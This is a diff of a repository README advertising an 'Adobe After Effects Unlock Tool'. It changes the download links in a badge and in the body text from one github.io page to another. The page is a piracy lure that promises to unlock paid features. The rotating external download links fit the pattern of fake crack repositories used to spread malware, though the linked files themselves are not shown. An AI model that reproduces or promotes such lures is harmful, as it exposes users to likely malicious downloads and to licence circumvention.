@@ -6,7 +6,7 @@
 <h1 align="center">⚡ Adobe After Effects Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/299" target="_blank">
+  <a href="https://aftereffectsload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20After%20Effects%20Unlock%20Tool-Enable%20All%20Features-9999FF?style=for-the-badge&logo=adobe&logoColor=white" 
          alt="Download Adobe After Effects Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -97,7 +97,7 @@ Questions or suggestions? Open an issue or create a pull request.
 ## ⭐ Unlock Adobe After Effects – Professional Motion Graphics and VFX
 
 Unlock all premium features of Adobe After Effects.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/299) and create stunning animations and visual effects.
+[Download the Unlock Tool](https://aftereffectsload.github.io/.github/) and create stunning animations and visual effects.
 
 ---
 
